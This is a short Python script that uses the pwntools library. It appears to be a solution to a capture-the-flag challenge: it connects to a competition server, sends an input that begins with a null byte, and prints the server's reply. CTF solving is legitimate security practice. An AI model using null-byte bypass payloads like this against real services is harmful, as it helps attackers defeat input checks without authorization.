from pwn import *
conn = remote('litctf.org', 31770)
conn.send(b'\x00lit\n')
print(conn.recvall().decode())